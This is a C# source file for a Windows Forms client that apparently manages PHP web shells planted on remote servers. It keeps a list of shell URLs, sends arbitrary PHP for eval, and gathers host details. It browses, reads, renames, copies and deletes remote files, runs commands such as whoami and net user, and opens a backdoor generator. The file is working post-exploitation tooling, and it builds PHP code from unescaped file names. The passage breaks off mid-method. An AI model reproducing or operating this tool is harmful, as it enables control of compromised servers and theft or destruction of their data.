using bantam.Properties;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Xml;

namespace bantam_php
{
    public partial class BantamMain : Form
    {
        /// <summary>
        /// 
        /// </summary>
        public const string CONFIG_FILE = "bantam.xml";

        /// <summary>
        /// 
        /// </summary>
        public String g_SelectedShellUrl;

        /// <summary>
        /// 
        /// </summary>
        public static Dictionary<String, HostInfo> Hosts = new Dictionary<String, HostInfo>();

        /// <summary>
        /// Static Forms
        /// </summary>
        public AddHost addClientForm, updateHostForm;
        public BackdoorGenerator backdoorGenerator;

        /// <summary>
        /// Main Form Constructor, performs the initialization routine, and requests some basic information about every server provided
        /// through the XML, then puts them into the gui
        /// </summary>
        public BantamMain()
        {
            InitializeComponent();

            //has to be initialized with parameters manually because, constructor with params breaks design mode...
            txtBoxFileBrowserPath.Initialize(btnFileBrowserBack_MouseClick, 21);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void BantamMain_Load(object sender, EventArgs e)
        {
            //XmlHelper.loadShells(CONFIG_FILE);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <returns></returns>
        public bool validTarget(string hostTarget = "")
        {
            if (string.IsNullOrEmpty(hostTarget))
            {
                hostTarget = g_SelectedShellUrl;
            }

            if (string.IsNullOrEmpty(hostTarget) == false
             && Hosts.ContainsKey(hostTarget) 
             && Hosts[hostTarget].Down == false)
            {
                return true;
            }
            return false;
        }

        //These are called/invoked when a non GUI thread needs to modify a GUI element
        #region THREAD_SAFE_DELEGATE_CALLBACKS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        /// <param name="pingMS"></param>
        public delegate void addClientDelegate(string hostTarget, string pingMS);
        public void addClientMethod(string hostTarget, string pingMS)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new addClientDelegate(addClientMethod), new object[] { hostTarget, pingMS });
                return;
            }

            ListViewItem lvi = new ListViewItem(new string[] { hostTarget, pingMS + " ms" });
            lvi.Font = new System.Drawing.Font("Microsoft Tai Le", 8F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            listViewClients.Items.Add(lvi);

            if (pingMS == "-")
            {
                int lastIndex = listViewClients.Items.Count - 1;
                listViewClients.Items[lastIndex].BackColor = System.Drawing.Color.Red;

                Hosts[hostTarget].Down = true;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="shellURL"></param>
        public delegate void guiCallbackRemoveShellURLDeledate(string shellURL);
        public void guiCallbackRemoveShellURL(string shellURL)
        {
            if (this.InvokeRequired)
            {
                this.Invoke(new guiCallbackRemoveShellURLDeledate(guiCallbackRemoveShellURL), shellURL);
                return;
            }

            ListViewItem selectedLvi = listViewClients.FindItemWithText(shellURL);
            if (selectedLvi != null)
            {
                listViewClients.FindItemWithText(shellURL).Remove();
            }
        }

        #endregion

        #region THREAD_ROUTINES

        /// <summary>
        /// Starts a thread that executes the php code
        /// </summary>
        /// <param name="phpCode"></param>
        /// <param name="title"></param>
        public async void executePHPCodeDisplayInRichTextBox(string phpCode, string title)
        {
            string result = await Task.Run(() => WebHelper.WebRequest(g_SelectedShellUrl, phpCode));

            if (string.IsNullOrEmpty(result) == false)
            {
                CustomForms.RichTextBoxDialog(title, result);
            }
            else
            {
                //TODO if (cfg messageboxes)
                MessageBox.Show("No Data Returned", "Welp...");
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="hostTarget"></param>
        public async void getInitDataThread(string hostTarget)
        {
            if (string.IsNullOrEmpty(hostTarget.ToString()) == false)
            {
                //start stopwatch for ping/estimated average response time
                Stopwatch pingWatch = new Stopwatch();
                pingWatch.Start();

                string result = await WebHelper.WebRequest(hostTarget, PhpHelper.initDataVars);

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] data = { null };
                    data = result.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                    var initDataReturnedVarCount = Enum.GetValues(typeof(PhpHelper.INIT_DATA_VARS)).Cast<PhpHelper.INIT_DATA_VARS>().Max();

                    if (data != null && data.Length == (int)initDataReturnedVarCount + 1)
                    {
                        //invokes a thread safe call from the GUI thread so we can safely update the GUI's listview
                        addClientMethod(hostTarget, pingWatch.ElapsedMilliseconds.ToString());

                        //add clients info to our local data handler
                        Hosts[hostTarget].update(pingWatch.ElapsedMilliseconds, data);
                    } else {
                        addClientMethod(hostTarget, "-");
                    }
                } else {
                    addClientMethod(hostTarget, "-");
                }
                pingWatch.Stop();
            }
        }

        #endregion

        #region GUI_EVENTS

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void evalToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            bool checkBoxChecked = true;
            string code = CustomForms.RichTextBoxEvalEditor("PHP Eval Editor - " + g_SelectedShellUrl, "", ref checkBoxChecked);

            if (string.IsNullOrEmpty(code) == false)
            {              
                if(checkBoxChecked)
                {
                    //execute the code and show it in a richtextbox
                    executePHPCodeDisplayInRichTextBox(code, "PHP Eval Result - " + g_SelectedShellUrl);
                } else {
                    string result = await WebHelper.WebRequest(g_SelectedShellUrl, code);
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void pingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);

            if (lvi != null
            && (Hosts[g_SelectedShellUrl].PingStopwatch == null 
            || Hosts[g_SelectedShellUrl].PingStopwatch.IsRunning == false))
            {
                //start client stopwatch
                Hosts[g_SelectedShellUrl].PingStopwatch = new Stopwatch();
                Hosts[g_SelectedShellUrl].PingStopwatch.Start();

                string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.phpTestExecutionWithEcho);

                lvi.SubItems[1].Text = Hosts[g_SelectedShellUrl].PingStopwatch.ElapsedMilliseconds.ToString() + " ms";
                Hosts[g_SelectedShellUrl].PingStopwatch.Stop();

            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void phpinfoToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.phpInfo);

            if (string.IsNullOrEmpty(result) == false)
            {
                BrowserView broView = new BrowserView(result, 1000, 1000);
                broView.Show();
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabPageFiles_Click(object sender, EventArgs e)
        {

        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void listviewClients_SelectedIndexChanged(object sender, EventArgs e)
        {
            ListViewItem lvi = GuiHelper.GetFirstSelectedListview(listViewClients);
            if (lvi != null)
            {
                //copy a backup of the current file tree view into clients
                if (treeViewFileBrowser.Nodes != null && treeViewFileBrowser.Nodes.Count > 0)
                {
                    //Clear previously cached treeview to only store 1 copy
                    if (!string.IsNullOrEmpty(g_SelectedShellUrl)
                    && Hosts[g_SelectedShellUrl].Files.Nodes.Count > 0)
                    {
                        Hosts[g_SelectedShellUrl].Files.Nodes.Clear();
                    }
                    //store current treeview into client and clear
                    GuiHelper.CopyNodes(treeViewFileBrowser, Hosts[g_SelectedShellUrl].Files);
                    treeViewFileBrowser.Nodes.Clear();
                }

                if (!string.IsNullOrEmpty(g_SelectedShellUrl) 
                 && Hosts.ContainsKey(g_SelectedShellUrl) 
                 && !string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].PWD)
                 && !string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
                {
                    Hosts[g_SelectedShellUrl].PWD = txtBoxFileBrowserPath.Text;
                   //MessageBox.Show(Hosts[g_SelectedTarget].PWD);
                }

                g_SelectedShellUrl = lvi.SubItems[0].Text;

                foreach (ListViewItem lvClients in listViewClients.Items)
                {
                    //todo store color and revert to original color, for now skip if red
                    if (lvClients.BackColor != System.Drawing.Color.Red)
                    {
                        lvClients.BackColor = System.Drawing.SystemColors.Window;
                        lvClients.ForeColor = System.Drawing.SystemColors.WindowText;
                    }
                }

                if (lvi.BackColor != System.Drawing.Color.Red)
                {
                    lvi.BackColor = System.Drawing.SystemColors.Highlight;
                    lvi.ForeColor = System.Drawing.SystemColors.HighlightText;
                }

                if (validTarget() == false)
                {
                    //clear the ui of invalid data
                    lblDynCWD.Text = "";
                    lblDynFreeSpace.Text = "";
                    lblDynHDDSpace.Text = "";
                    lblDynServerIP.Text = "";
                    lblDynUname.Text = "";
                    lblDynUser.Text = "";
                    lblDynWebServer.Text = "";
                    lblDynGroup.Text = "";
                    lblDynPHP.Text = "";
                    txtBoxFileBrowserPath.Text = "";
                    return;
                } else {
                    lblDynCWD.Text = Hosts[g_SelectedShellUrl].CWD;
                    lblDynFreeSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].FreeHDDSpace) ? "0"
                                         : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedShellUrl].FreeHDDSpace));

                    lblDynHDDSpace.Text = string.IsNullOrEmpty(Hosts[g_SelectedShellUrl].TotalHDDSpace) ? "0"
                                        : GuiHelper.FormatBytes(Convert.ToDouble(Hosts[g_SelectedShellUrl].TotalHDDSpace));

                    lblDynServerIP.Text     = Hosts[g_SelectedShellUrl].IP;
                    lblDynUname.Text        = Hosts[g_SelectedShellUrl].UnameRelease + " " + Hosts[g_SelectedShellUrl].UnameKernel;
                    lblDynUser.Text         = Hosts[g_SelectedShellUrl].UID + " ( " + Hosts[g_SelectedShellUrl].User + " )";
                    lblDynWebServer.Text    = Hosts[g_SelectedShellUrl].ServerSoftware;
                    lblDynGroup.Text        = Hosts[g_SelectedShellUrl].GID + " ( " + Hosts[g_SelectedShellUrl].Group + " )";
                    lblDynPHP.Text          = Hosts[g_SelectedShellUrl].PHP_Version;
                }

                if (tabControl1.SelectedTab == tabPageFiles)
                {
                    if (Hosts[g_SelectedShellUrl].Files.Nodes != null
                     && Hosts[g_SelectedShellUrl].Files.Nodes.Count > 0)
                    {
                        GuiHelper.CopyNodes(Hosts[g_SelectedShellUrl].Files, treeViewFileBrowser);
                        treeViewFileBrowser.Refresh();
                        treeViewFileBrowser.ExpandAll();

                        txtBoxFileBrowserPath.Text = Hosts[g_SelectedShellUrl].PWD;
                    } else {
                        start_FileBrowser();
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void tabControl1_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (tabControl1.SelectedTab == tabPageFiles)
            {
                //if the gui's treeview is empty and the cached treeview data is not empty
                if (treeViewFileBrowser.Nodes.Count == 0 
                && Hosts[g_SelectedShellUrl].Files.Nodes != null
                && Hosts[g_SelectedShellUrl].Files.Nodes.Count > 0)
                {
                    //populate the treeview from cache
                    GuiHelper.CopyNodes(Hosts[g_SelectedShellUrl].Files, treeViewFileBrowser);
                    treeViewFileBrowser.Refresh();
                    treeViewFileBrowser.ExpandAll();

                    txtBoxFileBrowserPath.Text = Hosts[g_SelectedShellUrl].PWD;
                } else {
                    //if the gui treeview is empty, start the filebrowser and display it
                    if (treeViewFileBrowser.Nodes.Count == 0)
                    {
                        start_FileBrowser();
                    }
                }
            }
        }


        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void saveClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            XmlHelper.saveShells(CONFIG_FILE);
        }

        private void pingClientsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            //keep alive checks with this?
        }

        private void addToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (addClientForm == null)
            {
                addClientForm = new AddHost();
            }
            addClientForm.Show();
        }

        private void listviewClientsContextMenu_Paint(object sender, PaintEventArgs e)
        {
            if (validTarget())
            {
                phpToolStripMenuItem.Visible = true;
                systemToolstripMenuItem.Visible = true;
                softwareToolStripMenuItem.Visible = true;

                if (Hosts[g_SelectedShellUrl].isWindows)
                {
                    linuxToolStripMenuItem.Visible = false;
                    windowsToolStripMenuItem.Visible = true;
                }
                else
                {
                    linuxToolStripMenuItem.Visible = true;
                    windowsToolStripMenuItem.Visible = false;
                }
            }
            else
            {
                phpToolStripMenuItem.Visible = false;
                systemToolstripMenuItem.Visible = false;
                softwareToolStripMenuItem.Visible = false;
            }
        }

        private void removeToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl) == false)
            {
                listViewClients.SelectedItems[0].Remove();
                Hosts.Remove(g_SelectedShellUrl);
            }
        }

        private async void pingToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            //Done this way because it possibly may be "down" and need retesting
            if (string.IsNullOrEmpty(g_SelectedShellUrl)
             || Hosts.ContainsKey(g_SelectedShellUrl) == false)
            {
                return;
            }

            string shellURL = g_SelectedShellUrl;
            string requestArgName = Hosts[shellURL].RequestArgName;
            bool sendViaCookie = Hosts[shellURL].SendDataViaCookie;

            listViewClients.FindItemWithText(shellURL).Remove();
            Hosts.Remove(shellURL);

            Hosts.Add(shellURL, new HostInfo());
            Hosts[shellURL].RequestArgName = requestArgName;
            Hosts[shellURL].SendDataViaCookie = sendViaCookie;

            getInitDataThread(shellURL);
        }

        private void backdoorGeneratorToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (backdoorGenerator == null)
            {
                backdoorGenerator = new BackdoorGenerator();
            }
            backdoorGenerator.Show();
        }

        private void saveShellsAsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveShellsXMLDialog = new SaveFileDialog();

            saveShellsXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
            saveShellsXMLDialog.FilterIndex = 2;
            saveShellsXMLDialog.RestoreDirectory = true;

            if (saveShellsXMLDialog.ShowDialog() == DialogResult.OK)
            {
                XmlHelper.saveShells(saveShellsXMLDialog.FileName);
            }
        }

        private async void openToolStripMenuItem_Click(object sender, EventArgs e)
        {
            OpenFileDialog openShellXMLDialog = new OpenFileDialog();
            openShellXMLDialog.Filter = "All files (*.*)|*.*|xml files (*.xml)|*.xml";
            openShellXMLDialog.FilterIndex = 2;
            openShellXMLDialog.RestoreDirectory = true;

            if (openShellXMLDialog.ShowDialog() == DialogResult.OK)
            {
                foreach (ListViewItem lvClients in listViewClients.Items)
                {
                    Hosts.Remove(lvClients.Text);
                    lvClients.Remove();
                }
                XmlHelper.loadShells(openShellXMLDialog.FileName);
            }
        }

        private void editToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (string.IsNullOrEmpty(g_SelectedShellUrl) == false)
            {
                string shellUrl = g_SelectedShellUrl;
                string varName = Hosts[g_SelectedShellUrl].RequestArgName;
                string varType = (Hosts[g_SelectedShellUrl].SendDataViaCookie ? "cookie" : "post");

                updateHostForm = new AddHost(shellUrl, varName, varType);
                updateHostForm.Show();
            }
        }

        #endregion

        #region FILE_BROWSER_EVENTS

        /// <summary>
        /// 
        /// </summary>
        private async void btnFileBrowserBack_MouseClick(object sender, EventArgs e)
        {
            filebrowserGoBack();
        }

        private async void btnFileBrowserGo_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (string.IsNullOrEmpty(txtBoxFileBrowserPath.Text))
            {
                return;
            }

            string hostTarget = g_SelectedShellUrl;
            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(txtBoxFileBrowserPath.Text, Hosts[g_SelectedShellUrl].PHP_Version);

            string result = await WebHelper.WebRequest(g_SelectedShellUrl, directoryContentsPHPCode);

            if (string.IsNullOrEmpty(hostTarget) == false)
            {
                //Clear preview treeview data
                Hosts[hostTarget].Files.Nodes.Clear();

                //if user didn't switch targets by the time this callback is triggered clear the live treeview
                if (g_SelectedShellUrl == hostTarget)
                {
                    treeViewFileBrowser.Nodes.Clear();
                    treeViewFileBrowser.Refresh();
                }

                //patch
                txtBoxFileBrowserPath.Text = result;

                //set path
                string path = txtBoxFileBrowserPath?.Text;
                if (string.IsNullOrEmpty(path))
                {
                    path = ".";
                }

                if (result != null && result.Length > 0)
                {
                    FileBrowserGo(result, hostTarget);
                }
            }
        }

        private async void FileBrowserGo(string result, string hostTarget)
        {
            string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

            if (rows.Length > 0 && rows != null)
            {
                foreach (string row in rows)
                {
                    string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                    if (columns != null && columns.Length - 2 > 0)
                    {
                        if (columns[columns.Length - 2] == "dir")
                        {
                            //if the user switched targets we do not update the live filebrowser because it is for a different target
                            if (g_SelectedShellUrl == hostTarget)
                            {
                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 0);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false)
                                {
                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                }
                            }
                            else
                            {
                                //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 0);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false)
                                {
                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                }
                            }
                        }
                        else
                        {
                            //if the user switched targets we do not update the live filebrowser because it is for a different target
                            if (g_SelectedShellUrl == hostTarget)
                            {
                                TreeNode lastTn = treeViewFileBrowser.Nodes.Add("", columns[0], 6);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false)
                                {
                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                }
                            }
                            else
                            {
                                //the user changed "hostTarget/targets" before the call back so we add it into their client cache instead of the live treeview
                                TreeNode lastTn = Hosts[hostTarget].Files.Nodes.Add("", columns[0], 6);
                                lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                if (string.IsNullOrEmpty(columns[2]) == false)
                                {
                                    lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                }
                            }
                        }
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        private async void start_FileBrowser()
        {
            if (validTarget() == false)
            {
                return;
            }

            string hostTarget = g_SelectedShellUrl;
            txtBoxFileBrowserPath.Text = Hosts[g_SelectedShellUrl].CWD;

            if (Hosts[g_SelectedShellUrl].isWindows)
            {
                txtBoxFileBrowserPath.Text = "";

                string result = await WebHelper.WebRequest(g_SelectedShellUrl, PhpHelper.getHardDriveLetters);

                if (string.IsNullOrEmpty(result) == false)
                {
                    string[] drives = { null };
                    drives = result.Split(new string[] { "|" }, StringSplitOptions.RemoveEmptyEntries);

                    if (drives != null && drives.Length > 0)
                    {
                        treeViewFileBrowser.Nodes.Clear();
                        foreach (string drive in drives)
                        {
                            treeViewFileBrowser.Nodes.Add("", drive, 3);
                        }
                    }
                }
            } else {
                string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(".", Hosts[g_SelectedShellUrl].PHP_Version);
                string result = await WebHelper.WebRequest(g_SelectedShellUrl, directoryContentsPHPCode);

                if (result != null && result.Length > 0)
                {
                    FileBrowserGo(result, hostTarget);
                }
            }

            if (tabControl1.SelectedTab != tabPageFiles)
            {
                tabControl1.SelectedTab = tabPageFiles;
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserToolStripMenuItem_Click(object sender, EventArgs e)
        {
            start_FileBrowser();
        }

        /// <summary>
        /// 
        /// </summary>
        private async void filebrowserGoBack()
        {
            if (validTarget() == false)
            {
                return;
            }

            string hostTarget = g_SelectedShellUrl;
            string[] paths = txtBoxFileBrowserPath.Text.Split('/');
            string lastPathRemoved = string.Join("/", paths, 0, paths.Count() - 1);

            if (string.IsNullOrEmpty(lastPathRemoved))
            {
                lastPathRemoved = "/";
            }

            string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(lastPathRemoved, Hosts[hostTarget].PHP_Version);
            string result = await WebHelper.WebRequest(hostTarget, directoryContentsPHPCode);

            if (string.IsNullOrEmpty(hostTarget) == false)
            {
                //Clear preview treeview data
                Hosts[hostTarget].Files.Nodes.Clear();

                //if user didn't switch targets by the time this callback is triggered clear the live treeview
                if (g_SelectedShellUrl == hostTarget)
                {
                    treeViewFileBrowser.Nodes.Clear();
                    treeViewFileBrowser.Refresh();

                    txtBoxFileBrowserPath.Text = lastPathRemoved;

                    string path = txtBoxFileBrowserPath?.Text;
                    if (string.IsNullOrEmpty(path))
                    {
                        path = ".";
                    }

                    if (result != null && result.Length > 0)
                    {
                        FileBrowserGo(result, hostTarget);
                    }
                }
            }
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void fileBrowserTreeView_MouseDoubleClick(object sender, MouseEventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string hostTarget = g_SelectedShellUrl;
            TreeNode tn = treeViewFileBrowser.SelectedNode;

            if (tn != null && tn.Nodes.Count == 0)
            {
                //replace backslash from the treenode path to a proper forward slash
                string path = tn.FullPath.Replace('\\', '/');

                if (path.Contains(".."))
                {
                    filebrowserGoBack();
                } else {
                    string fullPath = "";
                    if (Hosts[g_SelectedShellUrl].isWindows)
                    {
                        fullPath = path;
                    } else {
                        fullPath = txtBoxFileBrowserPath.Text + "/" + path;
                    }
                   
                    //Get Directory Contents PHP code
                    string directoryContentsPHPCode = PhpHelper.getDirectoryEnumerationCode(fullPath, Hosts[g_SelectedShellUrl].PHP_Version);
                    string result = await WebHelper.WebRequest(g_SelectedShellUrl, directoryContentsPHPCode);

                    if (string.IsNullOrEmpty(result) == false)
                    {
                        string[] rows = result.Split(new string[] { PhpHelper.rowSeperator }, StringSplitOptions.None);

                        if (rows.Length > 0 && rows != null)
                        {
                            foreach (string row in rows)
                            {
                                string[] columns = row.Split(new string[] { PhpHelper.colSeperator }, StringSplitOptions.None);

                                if (columns != null && columns.Length - 2 > 0)
                                {
                                    if (columns[columns.Length - 2] == "dir")
                                    {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (hostTarget == g_SelectedShellUrl)
                                        {
                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 0);
                                            lastTn.ForeColor = System.Drawing.Color.FromName(columns[columns.Length - 1]);

                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                        else
                                        {
                                            //TODO update their client cache here user changed clients
                                        }
                                    }
                                    else
                                    {
                                        //if the user switched targets we do not update the live filebrowser because it is for a different target
                                        if (hostTarget == g_SelectedShellUrl)
                                        {
                                            TreeNode lastTn = tn.Nodes.Add("", columns[0], 6);
                                            if (string.IsNullOrEmpty(columns[2]) == false)
                                            {
                                                lastTn.ToolTipText = GuiHelper.FormatBytes(Convert.ToDouble(columns[2]));
                                            }
                                        }
                                        else
                                        {
                                            //TODO update their client cache here user changed clients
                                        }
                                    }
                                }
                                else
                                {
                                    //MessageBox.Show(columns[0]);
                                }
                            }
                            tn.Expand();
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Override Prevents the filebrowser icon from being changed when selected
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {
            treeViewFileBrowser.SelectedImageIndex = e.Node.ImageIndex;
        }

        /// <summary>
        /// Hard re-fresh the filebrowser and start over at the (root) directory.
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void btnFileBrowserRefresh_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            if (treeViewFileBrowser.Nodes != null 
             && treeViewFileBrowser.Nodes.Count > 0)
            {
                Hosts[g_SelectedShellUrl].Files.Nodes.Clear();
                treeViewFileBrowser.Nodes.Clear();
                treeViewFileBrowser.Refresh();
            }
            start_FileBrowser();
        }


        /// <summary>
        /// Updates selected node on right click to ensure that we have the correct node selected whenever 
        /// we preform context menu stip events on the filebrowser
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void treeView1_NodeMouseClick(object sender, TreeNodeMouseClickEventArgs e)
        {
            if (e.Button == MouseButtons.Right && e.Node != null)
            {
                treeViewFileBrowser.SelectedNode = e.Node;
            }
        }

        private string fileBrowserGetFileName()
        {
            string fileName = treeViewFileBrowser.SelectedNode.FullPath.Replace('\\', '/');
            return txtBoxFileBrowserPath.Text.TrimEnd('/', '\\') + "/" + fileName;
        }

        /// <summary>
        //
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void readFileToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            string name     = fileBrowserGetFileName();
            string phpCode  = "@readfile('" + name + "');";

            executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + name);
        }

        /// <summary>
        /// Renames a file using the name input from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName     = fileBrowserGetFileName();
            string newFileName  = CustomForms.RenameFileDialog(fileName, "Renaming File");

            if (newFileName != "")
            {
                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";

                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
            }
        }

        /// <summary>
        /// Deletes a file after displaying a warning prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string path = fileBrowserGetFileName();
            DialogResult dialogResult = MessageBox.Show("Are you sure you want to delete \r\n(" + path + ")", "HOLD ON THERE COWBOY", MessageBoxButtons.YesNo);

            if (dialogResult == DialogResult.Yes)
            {
                //todo abstract
                string phpCode = "@unlink('" + path + "');";
                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
            }
        }

        /// <summary>
        /// Creates a copy of the selected file using the name from the prompt
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private async void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            string fileName     = fileBrowserGetFileName();
            string newFileName  = CustomForms.RenameFileDialog(fileName, "Copying File");

            if (newFileName != "")
            {
                string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                string result = await WebHelper.WebRequest(g_SelectedShellUrl, phpCode);
            }
        }

        #endregion

        #region OS_COMMANDS

        /// <summary>
        /// Shows process list inside of a read-only richtext editor
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void psAuxToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (validTarget() == false)
            {
                return;
            }

            bool isWin      = Hosts[g_SelectedShellUrl].isWindows;
            string phpCode  = PhpHelper.executeSystemCode(PhpHelper.getTaskListFunction(isWin));
            executePHPCodeDisplayInRichTextBox(phpCode, "Process List");
        }

        //Triggered via MENU_ITEM_CLICK

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetuserMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_NetUser);
            executePHPCodeDisplayInRichTextBox(phpCode, "User Account");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsNetaccountsMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_NetAccounts);
            executePHPCodeDisplayInRichTextBox(phpCode, "User Accounts");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsIpconfigMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_Ipconfig);
            executePHPCodeDisplayInRichTextBox(phpCode, "ipconfig");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void windowsVerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.windowsOS_Ver);
            executePHPCodeDisplayInRichTextBox(phpCode, "ver");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void whoamiToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.posixOS_Whoami);
            executePHPCodeDisplayInRichTextBox(phpCode, "whoami");
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="sender"></param>
        /// <param name="e"></param>
        private void linuxIfconfigMenuItem_Click(object sender, EventArgs e)
        {
            string phpCode = PhpHelper.executeSystemCode(PhpHelper.linuxOS_Ifconfig);
